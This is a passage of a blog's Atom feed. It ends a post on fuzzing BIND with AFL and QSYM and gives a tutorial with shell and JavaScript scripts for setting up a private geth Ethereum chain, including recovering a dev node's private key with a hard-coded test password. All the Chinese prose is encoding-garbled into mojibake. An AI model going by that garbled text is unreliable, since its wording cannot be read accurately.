&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CC=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-gcc&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CXX=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-g++&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;å¯¹bindè¿›è¡Œç¼–è¯‘&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;ä½¿ç”¨qsymè¿›è¡Œæµ‹è¯•ç»“åˆmopt-fast&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ä½¿ç”¨qsymè¿›è¡Œæµ‹è¯•ç»“åˆmopt-fast&quot;&gt;&lt;/a&gt; ä½¿ç”¨qsymè¿›è¡Œæµ‹è¯•ï¼ˆç»“åˆMOPT-FASTï¼‰&lt;/h2&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="QSYM" scheme="https://jingtianer.github.io/home/tags/QSYM/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
    <category term="bind" scheme="https://jingtianer.github.io/home/tags/bind/"/>
    
    <category term="MOPT" scheme="https://jingtianer.github.io/home/tags/MOPT/"/>
    
  </entry>
  
  <entry>
    <title>gethæ­å»ºç§é“¾</title>
    <link href="https://jingtianer.github.io/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/"/>
    <id>https://jingtianer.github.io/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/</id>
    <published>2023-01-10T03:28:00.000Z</published>
    <updated>2023-01-10T15:25:59.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸»è¦å·¥ä½œ"><a href="#ä¸»è¦å·¥ä½œ" class="headerlink" title="ä¸»è¦å·¥ä½œ"></a>ä¸»è¦å·¥ä½œ</h2><p>å‚è€ƒ<code>go-ethereum</code>å®˜ç½‘çš„<a href="https://geth.ethereum.org/docs/fundamentals/private-network">Private Networks</a>æ–‡æ¡£æ­å»ºäº†ä¸€ä¸ªç§æœ‰é“¾ï¼Œå¹¶æ€»ç»“å‡ºå‡ ä¸ªè„šæœ¬ï¼Œå¯ä»¥åŠè‡ªåŠ¨åŒ–åœ°å®ç°gethç½‘ç»œçš„æ­å»ºï¼Œè„šæœ¬å·²ä¸Šä¼ è‡³githubä»“åº“<a href="https://github.com/jingtianer/DLCCB">DLCCB</a></p><h2 id="setup-sh"><a href="#setup-sh" class="headerlink" title="setup.sh"></a>setup.sh</h2><ul><li>è¿™ä¸€æ­¥ä½¿ç”¨äº†ä»¥ä¸‹å‡ ä¸ªå·¥å…·<ul><li><code>geth</code>å‘½ä»¤ï¼Œç”¨äºç”Ÿæˆåˆå§‹ä¸¤ä¸ªèŠ‚ç‚¹çš„è´¦æˆ·ï¼Œä½¿ç”¨åˆ›ä¸–å—é…ç½®æ–‡ä»¶å¯¹ä¸¤ä¸ªè´¦æˆ·è¿›è¡Œåˆå§‹åŒ–</li><li><code>puppeth</code> ç”¨äºç”Ÿæˆåˆ›ä¸–å—çš„é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯äº¤äº’å¼çš„ï¼Œç¼–å†™äº†ä¸€ä¸ª<code>puppeth.txt</code>ä½œä¸ºå…¶è¾“å…¥ï¼Œé»˜è®¤ç”Ÿæˆä¸€ä¸ªåŸºäºpowçš„åŒºå—é“¾</li><li><code>bootnode</code> ç”¨äºç”Ÿæˆå¯åŠ¨bootnode</li></ul></li><li>è¿™ä¸€æ­¥ä½¿ç”¨äº†ä»¥ä¸‹å‡ ä¸ªlinuxå‘½ä»¤<ul><li><code>sed</code> éäº¤äº’å¼çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œç”¨äºè¯»å–ç”Ÿæˆçš„è´¦æˆ·çš„åŒºå—é“¾åœ°å€ï¼Œå†™å…¥<code>puppeth.txt</code>ä¸­ï¼Œä½¿å¾—<code>puppeth</code>å·¥å…·èƒ½ä¸ºåˆå§‹çš„ä¸¤ä¸ªèŠ‚ç‚¹åˆ†é…ä¸€å®šçš„ä»¥å¤ªå¸</li><li><code>awk</code>ï¼Œç”¨äºå¯¹æ–‡æœ¬çš„å¤„ç†</li></ul></li></ul><figure class="highlight sh"><figcaption><span>setup.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> node1 node2</span><br><span class="line">geth --datadir node1 account new &lt; password.txt</span><br><span class="line">geth --datadir node2 account new &lt; password.txt</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;5i<span class="subst">$(cat node1/keystore/UTC--* | awk &#x27;&#123;split($0, arr, <span class="string">&quot;\&quot;&quot;</span>)</span>; print arr[4]&#125;&#x27;)&quot;</span> puppeth.txt </span><br><span class="line">sed -i <span class="string">&quot;5i<span class="subst">$(cat node2/keystore/UTC--* | awk &#x27;&#123;split($0, arr, <span class="string">&quot;\&quot;&quot;</span>)</span>; print arr[4]&#125;&#x27;)&quot;</span> puppeth.txt </span><br><span class="line">puppeth &lt; puppeth.txt</span><br><span class="line">sed -i <span class="string">&quot;5d&quot;</span> puppeth.txt</span><br><span class="line">sed -i <span class="string">&quot;5d&quot;</span> puppeth.txt</span><br><span class="line"></span><br><span class="line">geth init --datadir node1 tianer.json</span><br><span class="line">geth init --datadir node2 tianer.json</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> password.txt | <span class="built_in">head</span> -n 1 | <span class="built_in">tee</span> node1/password.txt</span><br><span class="line"><span class="built_in">cat</span> password.txt | <span class="built_in">head</span> -n 1 | <span class="built_in">tee</span> node2/password.txt</span><br><span class="line"></span><br><span class="line">bootnode -genkey boot.key</span><br><span class="line">bootnode -nodekey boot.key -addr :30305</span><br></pre></td></tr></table></figure><h3 id="ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹"><a href="#ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹" class="headerlink" title="ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹"></a>ä¸¤ä¸ªè¾“å…¥æ–‡ä»¶çš„å†…å®¹</h3><figure class="highlight plaintext"><figcaption><span>password.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1234567890</span><br><span class="line">1234567890</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸¤ä¸ªèŠ‚ç‚¹çš„å¯†ç æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå¯ä»¥å•ç‹¬ä¸ºæ¯ä¸ªèŠ‚ç‚¹å†™ä¸€ä¸ªå¯†ç æ–‡ä»¶ï¼Œä½†æ˜¯å¯†ç æ–‡ä»¶å¿…é¡»ä¸¤è¡Œç›¸åŒï¼Œå› ä¸ºåˆ›å»ºè´¦æˆ·æ—¶éœ€è¦è¾“å…¥ä¸¤æ¬¡å¯†ç </p></blockquote><figure class="highlight plaintext"><figcaption><span>puppeth.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tianer</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">yes</span><br><span class="line">12345</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><blockquote><p>ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡å¯¹é…ç½®åˆ›ä¸–å—çš„é…ç½®æ–‡ä»¶è¿›è¡Œåˆ›å»ºï¼Œå¯¼å‡ºä¿å­˜ï¼Œåˆ é™¤ã€‚<br>ä¼šä½¿ç”¨sedå‘½ä»¤åœ¨ç¬¬äº”è¡Œä¸´æ—¶æ’å…¥åˆšåˆšç”Ÿæˆçš„è´¦æˆ·æ–‡ä»¶çš„åŒºå—é“¾åœ°å€ï¼Œè¿™æ ·<code>puppeth</code>å‘½ä»¤å°±çŸ¥é“è¦ç»™å“ªäº›åœ°å€åˆ†é…åˆå§‹çš„ä»¥å¤ªå¸</p></blockquote><h3 id="sedå‘½ä»¤"><a href="#sedå‘½ä»¤" class="headerlink" title="sedå‘½ä»¤"></a>sedå‘½ä»¤</h3><p>sed å‘½ä»¤æ˜¯ä¸€ä¸ªé¢å‘è¡Œå¤„ç†çš„å·¥å…·ï¼Œå®ƒä»¥â€œè¡Œâ€ä¸ºå¤„ç†å•ä½ï¼Œé’ˆå¯¹æ¯ä¸€è¡Œè¿›è¡Œå¤„ç†ï¼Œå¤„ç†åçš„ç»“æœä¼šè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰ã€‚ä½ ä¼šå‘ç° sed å‘½ä»¤æ˜¯å¾ˆæ‡‚ç¤¼è²Œçš„ä¸€ä¸ªå‘½ä»¤ï¼Œå®ƒä¸ä¼šå¯¹è¯»å–çš„æ–‡ä»¶åšä»»ä½•è´¸ç„¶çš„ä¿®æ”¹ï¼Œè€Œæ˜¯å°†å†…å®¹éƒ½è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚</p><ul><li><p>åŸºæœ¬ç”¨æ³•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [é€‰é¡¹] <span class="string">&quot;æŒ‡ä»¤&quot;</span> æ–‡ä»¶</span><br></pre></td></tr></table></figure></li><li><p>é€‰é¡¹ï¼Œå¦‚æœå¸Œæœ›sedå‘½ä»¤å¯¹æ–‡ä»¶ç›´æ¥è¿›è¡Œæ›´æ”¹ï¼Œéœ€è¦æ·»åŠ <code>-i</code>å‚æ•°ï¼Œ ä»¥ä¸‹æ˜¯å‡ ä¸ªæŸ¥é‚£ä¸ªç”¨çš„å‚æ•°</p><ul><li><code>-e</code> ã€€ã€€â€“å®ƒå‘Šè¯‰sedå°†ä¸‹ä¸€ä¸ªå‚æ•°è§£é‡Šä¸ºä¸€ä¸ªsedæŒ‡ä»¤ï¼Œåªæœ‰å½“å‘½ä»¤è¡Œä¸Šç»™å‡ºå¤šä¸ªsedæŒ‡ä»¤æ—¶ä½¿ç”¨</li><li><code>-f</code> ã€€ã€€â€“åè·Ÿä¿å­˜äº†sedæŒ‡ä»¤çš„æ–‡ä»¶</li><li><code>-i</code> ã€€ã€€â€“ç›´æ¥å¯¹å†…å®¹è¿›è¡Œä¿®æ”¹ï¼Œä¸åŠ  i æ—¶é»˜è®¤åªæ˜¯é¢„è§ˆï¼Œä¸ä¼šå¯¹æ–‡ä»¶è¿›è¡Œå®é™…ä¿®æ”¹</li><li><code>-n</code> ã€€ã€€â€“å–æ¶ˆé»˜è®¤è¾“å‡ºï¼Œsedé»˜è®¤ä¼šè¾“å‡ºæ‰€æœ‰æ–‡æœ¬å†…å®¹ï¼Œä½¿ç”¨ -n å‚æ•°ååªæ˜¾ç¤ºå¤„ç†è¿‡çš„è¡Œ</li></ul></li><li><p>æŒ‡ä»¤ï¼Œç±»ä¼¼vimï¼Œsedä¹Ÿæœ‰ç¼–è¾‘å‘½ä»¤</p><ul><li><code>a</code> ã€€ã€€  â€“è¿½åŠ ï¼Œå‘åŒ¹é…è¡Œåæ’å…¥å†…å®¹</li><li><code>c</code> ã€€    â€“æ›´æ”¹ï¼Œæ›´æ”¹åŒ¹é…è¡Œçš„å†…å®¹</li><li><code>i</code> ã€€    â€“æ’å…¥ï¼Œå‘åŒ¹é…è¡Œå‰æ’å…¥å†…å®¹</li><li><code>d</code>   ã€€ã€€â€“åˆ é™¤ï¼Œåˆ é™¤åŒ¹é…çš„å†…å®¹</li><li><code>s</code>   ã€€ã€€â€“æ›¿æ¢ï¼Œæ›¿æ¢åŒ¹é…åˆ°çš„å†…å®¹</li><li><code>p</code> ã€€    â€“æ‰“å°ï¼Œæ‰“å°åŒ¹é…åˆ°çš„å†…å®¹ï¼Œé€šå¸¸ä¸ -n å’Œç”¨</li><li><code>=</code> ã€€ã€€  â€“ç”¨æ¥æ‰“å°è¢«åŒ¹é…åˆ°çš„è¡Œçš„è¡Œå·</li><li><code>n</code>ã€€ã€€   â€“è¯»å–ä¸‹ä¸€è¡Œï¼Œé‡åˆ°næ—¶ä¼šè‡ªåŠ¨è·³å…¥ä¸‹ä¸€è¡Œ</li><li><code>r,w</code> ã€€ã€€â€“è¯»å’Œå†™ï¼Œrç”¨äºå°†å†…å®¹è¯»å…¥æ–‡ä»¶ï¼Œwç”¨äºå°†åŒ¹é…å†…å®¹å†™å…¥åˆ°æ–‡ä»¶</li></ul></li></ul><blockquote><p>å…¶ä¸­<code>s</code>å‘½ä»¤åè·Ÿæ­£åˆ™ä¸²å’Œç›®æ ‡ä¸²ï¼Œå¯ä»¥èµ·åˆ°æ–‡æœ¬çš„åŒ¹é…æ›¿æ¢<br><code>sed</code>çš„æŒ‡ä»¤ä½¿ç”¨<code>/</code>ä½œä¸ºå®šç•Œç¬¦ï¼Œè½¬ä¹‰ç¬¦ä¸º<code>\</code></p></blockquote><p>ä¾‹å­ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/book/books/&#x27;</span> file</span><br><span class="line">sed -i <span class="string">&#x27;s/book/books/g&#x27;</span> file <span class="comment"># åç¼€gå¯¹æ¯è¡Œçš„æ‰€æœ‰åŒ¹é…è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">sed -i <span class="string">&#x27;2d&#x27;</span> file <span class="comment">#åˆ é™¤æŒ‡å®šè¡Œ</span></span><br><span class="line">sed -i <span class="string">&#x27;5ixxxxx&#x27;</span> file <span class="comment">#åœ¨æŒ‡å®šè¡Œæ’å…¥xxxxx</span></span><br></pre></td></tr></table></figure><ul><li>å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/L1259863243/article/details/79364094">è¿™é‡Œ</a></li></ul><h3 id="awkå‘½ä»¤"><a href="#awkå‘½ä»¤" class="headerlink" title="awkå‘½ä»¤"></a>awkå‘½ä»¤</h3><p>AWK æ˜¯ä¸€ç§å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„è¯­è¨€ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ã€‚<br>ä¹‹æ‰€ä»¥å« AWK æ˜¯å› ä¸ºå…¶å–äº†ä¸‰ä½åˆ›å§‹äºº Alfred Ahoï¼ŒPeter Weinberger, å’Œ Brian Kernighan çš„ Family Name çš„é¦–å­—ç¬¦<br>linuxä¸­æœ‰ä¸‰å‰‘å®¢ä¹‹ç§°ï¼š<br>ä¸‰å‰‘å®¢ä¹‹é¦–å°±æ˜¯ AWK<br>ä¸‰å‰‘å®¢åŠŸèƒ½:<br>grep ï¼š è¿‡æ»¤æ–‡æœ¬<br>sed  :  ä¿®æ”¹æ–‡æœ¬<br>awk  :  å¤„ç†æ–‡æœ¬</p><ul><li>è¯­æ³•æ ¼å¼</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk [å‚æ•°] [å¤„ç†å†…å®¹] [æ“ä½œå¯¹è±¡]</span><br></pre></td></tr></table></figure><ul><li>å…·ä½“å¯ä»¥å‚è€ƒ<a href="http://c.biancheng.net/view/4082.html">è¿™é‡Œ</a></li></ul><h2 id="mine-sh"><a href="#mine-sh" class="headerlink" title="mine.sh"></a>mine.sh</h2><p>ç”¨äºå¯åŠ¨åˆ›å»ºçš„ä¸¤ä¸ªèŠ‚ç‚¹</p><figure class="highlight sh"><figcaption><span>mine.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NODE=<span class="variable">$2</span></span><br><span class="line">ENODE=<span class="variable">$1</span></span><br><span class="line">AUTHRPCPORT=$((<span class="variable">$2</span>+<span class="number">8554</span>))</span><br><span class="line">PORT=$((<span class="variable">$2</span>+<span class="number">30308</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> geth --datadir node<span class="variable">$NODE</span> --port <span class="variable">$PORT</span> --bootnodes <span class="variable">$ENODE</span> --networkid 12345 --unlock 0x$(<span class="built_in">cat</span> node<span class="variable">$NODE</span>/keystore/UTC--* | awk <span class="string">&#x27;&#123;split($0, arr, &quot;\&quot;&quot;); print arr[4]&#125;&#x27;</span>) --password node1/password.txt --authrpc.port <span class="variable">$AUTHRPCPORT</span></span><br><span class="line"></span><br><span class="line">geth --datadir node<span class="variable">$NODE</span> --port <span class="variable">$PORT</span> --bootnodes <span class="variable">$ENODE</span> --networkid 12345 --unlock 0x$(<span class="built_in">cat</span> node<span class="variable">$NODE</span>/keystore/UTC--* | awk <span class="string">&#x27;&#123;split($0, arr, &quot;\&quot;&quot;); print arr[4]&#125;&#x27;</span>) --password node1/password.txt --authrpc.port <span class="variable">$AUTHRPCPORT</span> --mine</span><br></pre></td></tr></table></figure><blockquote><p>å‰ä¸€ä¸ªè„šæœ¬æ‰§è¡Œåï¼Œä¼šè¾“å‡ºenodeï¼Œ å°†å…¶å¤åˆ¶ä¸‹æ¥ï¼Œæ‰“å¼€ä¸¤ä¸ªæ–°çš„terminalçª—å£ï¼Œenodeä½œä¸ºè¿™ä¸ªè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¸Œæœ›å¯åŠ¨çš„èŠ‚ç‚¹çš„ç¼–å·</p></blockquote><h2 id="attach-sh"><a href="#attach-sh" class="headerlink" title="attach.sh"></a>attach.sh</h2><p>ç”¨äºè®©ä¸¤ä¸ªèŠ‚ç‚¹å¼€å§‹æŒ–çŸ¿ï¼Œä½¿ç”¨<code>geth attach</code>æ‰“å¼€jsäº¤äº’ç•Œé¢ï¼Œ<code>miner.txt</code>ä½œä¸ºè¾“å…¥æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤<code>miner.start(1)</code>å¼€å§‹æŒ–çŸ¿</p><figure class="highlight sh"><figcaption><span>attach.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> geth attach node<span class="variable">$NODE</span>/geth.ipc</span><br><span class="line">geth attach node<span class="variable">$NODE</span>/geth.ipc  &lt; miner.txt</span><br></pre></td></tr></table></figure><blockquote><p>å‚æ•°ä¸ºå¸Œæœ›å¼€å§‹æŒ–çŸ¿çš„èŠ‚ç‚¹ç¼–å·ï¼Œä¹Ÿéœ€è¦æ‰“å¼€æ–°çš„terminalæ‰§è¡Œ</p></blockquote><figure class="highlight js"><figcaption><span>miner.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.<span class="property">peerCount</span></span><br><span class="line">eth.<span class="title function_">getBalance</span>(eth.<span class="property">accounts</span>[<span class="number">0</span>])</span><br><span class="line">miner.<span class="title function_">start</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="sk-js"><a href="#sk-js" class="headerlink" title="sk.js"></a>sk.js</h2><p>ç”¨äºè·å–èŠ‚ç‚¹çš„ç§é’¥ï¼Œåœ¨å¼€å‘æ—¶ç§é’¥å¾ˆé‡è¦</p><figure class="highlight js"><figcaption><span>sk.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> keythereum = <span class="built_in">require</span>(<span class="string">&quot;keythereum&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> datadir = <span class="string">&quot;/home/tt/eth/net/node2/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> address= <span class="string">&quot;e43b98ac32beb344c94b15b9af5b46674d6c3e6d&quot;</span>;<span class="comment">//è¦å°å†™</span></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> keyObject = keythereum.<span class="title function_">importFromFile</span>(address, datadir);</span><br><span class="line"><span class="keyword">var</span> privateKey = keythereum.<span class="title function_">recover</span>(password, keyObject);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(privateKey.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>éœ€è¦èŠ‚ç‚¹çš„<code>datadir</code>å’ŒèŠ‚ç‚¹çš„<code>address</code></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ä¸»è¦å·¥ä½œ&quot;&gt;&lt;a href=&quot;#ä¸»è¦å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;ä¸»è¦å·¥ä½œ&quot;&gt;&lt;/a&gt;ä¸»è¦å·¥ä½œ&lt;/h2&gt;&lt;p&gt;å‚è€ƒ&lt;code&gt;go-ethereum&lt;/code&gt;å®˜ç½‘çš„&lt;a href=&quot;https://geth.ethereum.org/docs/fundamentals/private-network&quot;&gt;Private Networks&lt;/a&gt;æ–‡æ¡£æ­å»ºäº†ä¸€ä¸ªç§æœ‰é“¾ï¼Œå¹¶æ€»ç»“å‡ºå‡ ä¸ªè„šæœ¬ï¼Œå¯ä»¥åŠè‡ªåŠ¨åŒ–åœ°å®ç°gethç½‘ç»œçš„æ­å»ºï¼Œè„šæœ¬å·²ä¸Šä¼ è‡³githubä»“åº“&lt;a href=&quot;https://github.com/jingtianer/DLCCB&quot;&gt;DLCCB&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;setup-sh&quot;&gt;&lt;a href=&quot;#setup-sh&quot; class=&quot;headerlink&quot; title=&quot;setup.sh&quot;&gt;&lt;/a&gt;setup.sh&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;è¿™ä¸€æ­¥ä½¿ç”¨äº†ä»¥ä¸‹å‡ ä¸ªå·¥å…·&lt;ul&gt;
&lt;li&gt;&lt;code&gt;geth&lt;/code&gt;å‘½ä»¤ï¼Œç”¨äºç”Ÿæˆåˆå§‹ä¸¤ä¸ªèŠ‚ç‚¹çš„è´¦æˆ·ï¼Œä½¿ç”¨åˆ›ä¸–å—é…ç½®æ–‡ä»¶å¯¹ä¸¤ä¸ªè´¦æˆ·è¿›è¡Œåˆå§‹åŒ–&lt;/li&gt;
&lt;li&gt;&lt;code&gt;puppeth&lt;/code&gt; ç”¨äºç”Ÿæˆåˆ›ä¸–å—çš„é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯äº¤äº’å¼çš„ï¼Œç¼–å†™äº†ä¸€ä¸ª&lt;code&gt;puppeth.txt&lt;/code&gt;ä½œä¸ºå…¶è¾“å…¥ï¼Œé»˜è®¤ç”Ÿæˆä¸€ä¸ªåŸºäºpowçš„åŒºå—é“¾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bootnode&lt;/code&gt; ç”¨äºç”Ÿæˆå¯åŠ¨bootnode&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è¿™ä¸€æ­¥ä½¿ç”¨äº†ä»¥ä¸‹å‡ ä¸ªlinuxå‘½ä»¤&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sed&lt;/code&gt; éäº¤äº’å¼çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œç”¨äºè¯»å–ç”Ÿæˆçš„è´¦æˆ·çš„åŒºå—é“¾åœ°å€ï¼Œå†™å…¥&lt;code&gt;puppeth.txt&lt;/code&gt;ä¸­ï¼Œä½¿å¾—&lt;code&gt;puppeth&lt;/code&gt;å·¥å…·èƒ½ä¸ºåˆå§‹çš„ä¸¤ä¸ªèŠ‚ç‚¹åˆ†é…ä¸€å®šçš„ä»¥å¤ªå¸&lt;/li&gt;
&lt;li&gt;&lt;code&gt;awk&lt;/code&gt;ï¼Œç”¨äºå¯¹æ–‡æœ¬çš„å¤„ç†&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;setup.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; node1 node2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth --datadir node1 account new &amp;lt; password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth --datadir node2 account new &amp;lt; password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5i&lt;span class=&quot;subst&quot;&gt;$(cat node1/keystore/UTC--* | awk &amp;#x27;&amp;#123;split($0, arr, &lt;span 